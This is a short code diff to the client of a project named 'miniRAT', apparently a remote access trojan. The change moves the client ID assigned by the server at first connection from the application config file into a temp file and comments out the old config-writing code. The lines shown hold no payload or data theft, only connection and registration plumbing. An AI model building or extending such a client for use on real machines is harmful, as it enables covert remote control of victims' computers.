@@ -17,7 +17,7 @@ namespace miniRAT
         //must be same in client and server
         const string separator = "|||";
 
-        static Guid clientID = string.IsNullOrEmpty(ConfigurationManager.AppSettings["GUIDKEY"])? Guid.Empty:Guid.Parse(ConfigurationManager.AppSettings["GUIDKEY"]);
+        static Guid clientID = TempFile.ReadTmpFileGuid();
         static TcpClient tcpClient;
         private static Mutex sendMutex = new Mutex();
 
@@ -114,10 +114,11 @@ namespace miniRAT
                 clientID = Guid.Parse(helloArray[0].ToString());
 
                 // set client key give from server in first time connected and set to appsetting to use it in next connectin to the server
-                Configuration configuration = ConfigurationManager.OpenExeConfiguration(ConfigurationUserLevel.None);
-                configuration.AppSettings.Settings["GUIDKEY"].Value = clientID.ToString();
-                configuration.Save(ConfigurationSaveMode.Modified);
-                ConfigurationManager.RefreshSection("appSettings");
+                TempFile.UpdateTmpFileGuid(clientID.ToString());
+                //Configuration configuration = ConfigurationManager.OpenExeConfiguration(ConfigurationUserLevel.None);
+                //configuration.AppSettings.Settings["GUIDKEY"].Value = clientID.ToString();
+                //configuration.Save(ConfigurationSaveMode.Modified);
+                //ConfigurationManager.RefreshSection("appSettings");
 
                 Console.WriteLine("Connected to server id= " + clientID.ToString());
             }
